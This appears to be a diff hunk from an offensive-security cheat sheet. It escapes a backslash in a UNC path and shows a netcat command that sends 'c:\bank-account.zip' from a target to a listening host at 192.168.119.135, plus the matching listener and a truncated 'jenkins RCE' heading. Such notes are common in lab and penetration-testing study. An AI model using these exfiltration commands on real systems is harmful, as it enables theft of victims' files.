@@ -25,7 +25,7 @@ Collection of pain in the ass commands which take a bit of googling to find the 
 - C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe 
 
 ```nc.exe file transfers```
-- \\192.168.119.135\nc.exe -w 3 192.168.119.135 9001 < c:\bank-account.zip 
+- \\\\192.168.119.135\nc.exe -w 3 192.168.119.135 9001 < c:\bank-account.zip 
 - nc -lvp 9001 > bank-account.zip 
 
 ```jenkins RCE```
